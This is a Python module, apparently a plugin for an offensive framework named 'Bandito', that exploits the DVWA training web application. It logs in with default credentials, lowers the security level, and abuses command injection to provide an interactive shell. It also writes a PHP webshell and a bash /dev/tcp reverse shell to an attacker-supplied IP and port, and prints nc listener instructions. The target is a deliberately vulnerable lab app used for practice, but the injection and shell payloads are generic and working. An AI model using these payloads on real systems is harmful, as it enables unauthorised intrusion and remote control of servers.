import requests
import os
from datetime import datetime

class Tool:
    def __init__(self):
        self.name = "dvwa_web"
        self.target = "http://192.168.107.129"
        self.user = "admin"
        self.password = "password"
        self.upload_path = "/srv/dvwa/hackable/uploads"
        self.session = None
        self.logged_in = False

    def show_help(self):
        print("\n=== DVWA Web Exploitation Tool ===")
        print(f"  target: {self.target}")
        print("Commands:")
        print("  setup                    - Login + set security to Low")
        print("  shell                    - Interactive command shell (Part 1)")
        print("  upload_webshell          - Upload simple PHP webshell (Part 2)")
        print("  upload_revshell <ip> <port> - Upload reverse shell (Part 2)")
        print("  set target <url>         - Change target IP/URL")
        print("  back / exit              - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip().lower()

        if cmd == "show options" or cmd == "help":
            self.show_help()
            return

        if cmd.startswith("set target"):
            value = cmd_input.split(maxsplit=2)[2].strip()
            if not value.startswith(("http://", "https://")):
                value = "http://" + value
            self.target = value.rstrip("/")
            print(f"[+] Target updated to {self.target}")
            return

        if cmd in ["setup", "login"]:
            self._login()
            return

        if cmd == "shell":
            if not self.logged_in:
                self._login()
            if self.logged_in:
                self.interactive_shell()
            return

        if cmd == "upload_webshell":
            if not self.logged_in:
                self._login()
            if self.logged_in:
                self.upload_webshell()
            return

        if cmd.startswith("upload_revshell"):
            parts = cmd_input.split()
            if len(parts) < 3:
                print("Usage: upload_revshell <your_ip> <port>")
                return
            if not self.logged_in:
                self._login()
            if self.logged_in:
                self.upload_revshell(parts[1], parts[2])
            return

        if cmd in ["back", "exit", "quit"]:
            print("[*] Returning to Bandito framework...")
            return

        print("Unknown command. Type 'help' for options.")

    def _login(self):
        if self.logged_in:
            print("[+] Already logged in")
            return

        print(f"[*] Logging into {self.target}...")
        self.session = requests.Session()

        login_url = f"{self.target}/login.php"
        r_get = self.session.get(login_url)

        token_marker = "name='user_token' value='"
        token_pos = r_get.text.find(token_marker)
        user_token = ""
        if token_pos != -1:
            start = token_pos + len(token_marker)
            end = r_get.text.find("'", start)
            user_token = r_get.text[start:end]

        login_data = {
            "username": self.user,
            "password": self.password,
            "user_token": user_token,
            "Login": "Login"
        }
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed - check target/IP")
            return

        sec_url = f"{self.target}/security.php"
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print("[+] Security level set to Low")
        self.show_help()

    def interactive_shell(self):
        print("\ndvwa> Interactive shell (type 'exit' to return)\n")
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        while True:
            try:
                cmd = input("dvwa> ").strip()
                if cmd.lower() in ["exit", "back", "quit"]:
                    return
                if not cmd:
                    continue

                payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
                data = {"ip": payload, "Submit": "Submit"}

                r = self.session.post(vuln_url, data=data)

                if "<pre>" in r.text and "</pre>" in r.text:
                    output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
                else:
                    output = r.text.strip()

                print(output if output else "[no output]")
                print("-" * 60)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                return

    def upload_webshell(self):
        webshell = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        safe = webshell.replace("'", "'\\''")

        cmd = f"echo '{safe}' > {self.upload_path}/shell.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Webshell uploaded")
        print(f"Test in browser: {self.target}/hackable/uploads/shell.php?cmd=whoami")
        print("Commands: ?cmd=whoami, ?cmd=id, ?cmd=ip%20a")

    def upload_revshell(self, attacker_ip, port):
        rev = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\'"); ?>'
        safe = rev.replace("'", "'\\''").replace("\\", "\\\\")

        cmd = f"echo '{safe}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Reverse shell uploaded")
        print(f"Trigger: {self.target}/hackable/uploads/rev.php")
        print(f"Listener: nc -lvnp {port}")
        print("Open the trigger URL in browser to catch shell")